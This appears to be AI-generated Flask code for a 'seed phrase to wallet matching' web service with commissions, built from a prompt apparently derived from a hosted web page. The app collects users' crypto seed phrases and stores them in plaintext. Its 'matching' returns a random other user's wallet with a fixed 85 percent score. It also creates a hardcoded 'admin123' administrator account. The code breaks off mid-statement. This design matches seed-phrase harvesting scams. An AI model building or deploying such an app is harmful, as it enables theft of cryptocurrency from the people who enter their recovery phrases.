"""
Generated Code Metadata:
========================
Original URL: https://authorization-b6o.pages.dev
Prompt: Create a web interface for a service that matches seed phrases to wallets, incorporating features like authorization, customization, algorithm execution, and commission calculation.
Generated: DETERMINISTIC_a362e5828d5d51b5
Batch ID: 20250612_152249
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Generated Code:
# ===============

```python
# Import necessary libraries
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, flash
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3
import hashlib
import json
import os
from functools import wraps

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.urandom(24)

# Database configuration
DATABASE = 'wallet_matcher.db'

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# User class for Flask-Login
class User(UserMixin):
    def __init__(self, id, username, password_hash, is_admin=False):
        self.id = id
        self.username = username
        self.password_hash = password_hash
        self.is_admin = is_admin

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

# Database helper functions
def get_db():
    db = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        cursor = db.cursor()
        
        # Create users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                is_admin BOOLEAN DEFAULT FALSE
            )
        ''')
        
        # Create wallets table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                seed_phrase TEXT NOT NULL,
                wallet_address TEXT NOT NULL,
                balance REAL DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        # Create matches table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS matches (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                requester_id INTEGER NOT NULL,
                provider_id INTEGER NOT NULL,
                seed_phrase_hash TEXT NOT NULL,
                wallet_address TEXT NOT NULL,
                match_percentage REAL NOT NULL,
                commission REAL DEFAULT 0,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (requester_id) REFERENCES users (id),
                FOREIGN KEY (provider_id) REFERENCES users (id)
            )
        ''')
        
        # Create admin user if not exists
        cursor.execute('SELECT * FROM users WHERE is_admin = 1')
        admin = cursor.fetchone()
        if not admin:
            admin_password = generate_password_hash('admin123')
            cursor.execute('INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)', 
                          ('admin', admin_password, True))
        
        db.commit()

# User loader for Flask-Login
@login_manager.user_loader
def load_user(user_id):
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
    user_data = cursor.fetchone()
    if user_data:
        return User(id=user_data['id'], 
                   username=user_data['username'], 
                   password_hash=user_data['password_hash'],
                   is_admin=user_data['is_admin'])
    return None

# Custom decorator for admin access
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            flash('Admin access required', 'danger')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Authentication routes
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = generate_password_hash(password)
        
        db = get_db()
        cursor = db.cursor()
        
        try:
            cursor.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)', 
                          (username, password_hash))
            db.commit()
            flash('Registration successful. Please login.', 'success')
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            flash('Username already exists', 'danger')
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
        user_data = cursor.fetchone()
        
        if user_data and check_password_hash(user_data['password_hash'], password):
            user = User(id=user_data['id'], 
                       username=user_data['username'], 
                       password_hash=user_data['password_hash'],
                       is_admin=user_data['is_admin'])
            login_user(user)
            flash('Login successful', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password', 'danger')
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

# Main application routes
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/dashboard')
@login_required
def dashboard():
    db = get_db()
    cursor = db.cursor()
    
    # Get user's wallets
    cursor.execute('SELECT * FROM wallets WHERE user_id = ?', (current_user.id,))
    wallets = cursor.fetchall()
    
    # Get pending matches
    cursor.execute('''
        SELECT m.*, u.username as provider_username 
        FROM matches m 
        JOIN users u ON m.provider_id = u.id 
        WHERE m.requester_id = ? AND m.status = 'pending'
    ''', (current_user.id,))
    pending_matches = cursor.fetchall()
    
    # Get completed matches
    cursor.execute('''
        SELECT m.*, u.username as counterparty_username 
        FROM matches m 
        JOIN users u ON (m.requester_id = u.id OR m.provider_id = u.id) 
        WHERE (m.requester_id = ? OR m.provider_id = ?) AND m.status = 'completed' AND u.id != ?
    ''', (current_user.id, current_user.id, current_user.id))
    completed_matches = cursor.fetchall()
    
    return render_template('dashboard.html', 
                          wallets=wallets, 
                          pending_matches=pending_matches,
                          completed_matches=completed_matches)

@app.route('/add_wallet', methods=['POST'])
@login_required
def add_wallet():
    seed_phrase = request.form['seed_phrase']
    wallet_address = request.form['wallet_address']
    
    # Basic validation
    if not seed_phrase or not wallet_address:
        flash('Both seed phrase and wallet address are required', 'danger')
        return redirect(url_for('dashboard'))
    
    db = get_db()
    cursor = db.cursor()
    
    try:
        cursor.execute('INSERT INTO wallets (user_id, seed_phrase, wallet_address) VALUES (?, ?, ?)', 
                      (current_user.id, seed_phrase, wallet_address))
        db.commit()
        flash('Wallet added successfully', 'success')
    except Exception as e:
        db.rollback()
        flash('Error adding wallet', 'danger')
    
    return redirect(url_for('dashboard'))

@app.route('/request_match', methods=['POST'])
@login_required
def request_match():
    seed_phrase = request.form['seed_phrase']
    
    if not seed_phrase:
        flash('Seed phrase is required', 'danger')
        return redirect(url_for('dashboard'))
    
    # Hash the seed phrase for matching
    seed_phrase_hash = hashlib.sha256(seed_phrase.encode()).hexdigest()
    
    db = get_db()
    cursor = db.cursor()
    
    try:
        # Find potential matches (simplified matching algorithm)
        cursor.execute('''
            SELECT w.*, u.username 
            FROM wallets w 
            JOIN users u ON w.user_id = u.id 
            WHERE w.user_id != ? 
            ORDER BY RANDOM() 
            LIMIT 1
        ''', (current_user.id,))
        potential_match = cursor.fetchone()
        
        if potential_match:
            # Calculate match percentage (simplified)
            match_percentage = 85.0  # In a real app, this would be calculated
            
            # Calculate commission (5% of match percentage)
            commission = match_percentage * 0.05
            
            # Create match record
            cursor.execute('''
                INSERT INTO matches 
                (requester_id, provider_id, seed_phrase_hash, wallet_address, match_percentage, commission) 
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (current_user.id, potential_match['user_id'], seed_phrase_hash
